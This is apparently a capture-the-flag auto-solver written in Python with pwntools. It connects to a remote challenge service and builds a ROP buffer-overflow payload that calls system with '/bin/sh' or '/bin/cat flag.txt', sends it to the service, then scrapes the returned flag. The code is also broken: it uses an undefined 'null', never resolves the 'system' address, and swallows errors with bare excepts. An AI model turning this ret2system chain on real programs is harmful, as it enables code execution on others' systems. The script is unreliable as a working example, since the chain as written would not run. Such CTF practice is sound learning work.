from pwn import *
import detection
import re

# context.log_level = 'ERROR'
# logging.disable(logging.CRITICAL)

# im aware this looks like trash but ill fix it in post


def exploit(binary: str):
    flag_regex = r'flag\{[^}]+\}'

    url = f'ace-service-{binary}.chals.io'
    p = remote(url, 443, ssl=True, sni=url)
    if p:
        print('connected')
    e = ELF(binary)
    r = ROP(e)

    p.recvuntil(b'>>>')

    payload = b''

    offset = detection.find_rip_offset(binary)
    print("Offset:", offset)
    system = null
    pop_rdi = null
    print(e.symbols)
    try:
        pop_rdi = (r.find_gadget(['pop rdi', 'ret']))[0]
    except:
        print('pop rdi; ret; not found')
        pass
    # print(pop_rdi)
    shell = null
    cat = null
    try:
        shell = next(e.search(b'/bin/sh\x00'))
    except:
        print('bin/shell not found')
        pass
    try:
        cat = next(e.search(b'/bin/cat flag.txt\x00'))
    except:
        print('bin/cat flag not found')
        pass
    # try:
    #     system = e.sym['exit']
    # except KeyError:
    #     print('system not found in a ret2system lol')
    print(system)
    payload += cyclic(offset)
    payload += p64(pop_rdi)  # pop RDI
    if cat != null:
        print('bin/cat')
        payload += p64(cat)
        payload += p64(system)
        p.sendline(payload)
    elif shell != null:
        print('bin/sh')
        payload += p64(shell)
        payload += p64(system)
        p.sendline(payload)
        # p.wait()
        p.sendline(b'cat flag.txt')
        # p.interactive()
    else:
        print('uhhhhhhhhhhhh')

    output = p.recvall(timeout=0.2)

    flag = re.findall(flag_regex, output.decode())
    if flag:
        return flag[0]
    else:
        return


def main():  # TEMP FOR TESTING
    # for i in range(10):
    print(f"bin-ret2syscall-{0}")
    exploit(f"bin-ret2syscall-{0}")


main()
